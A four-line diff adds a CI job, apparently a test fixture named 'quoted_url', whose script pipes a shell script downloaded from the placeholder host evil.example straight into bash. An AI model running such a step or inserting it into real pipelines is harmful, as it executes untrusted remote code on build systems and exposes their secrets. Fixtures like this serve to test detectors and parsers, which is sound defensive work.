@@ -1,0 +1,4 @@
+quoted_url:
+  image: alpine:3.19
+  script:
+    - sh -c "curl -fsSL 'https://evil.example/x.sh' | bash"
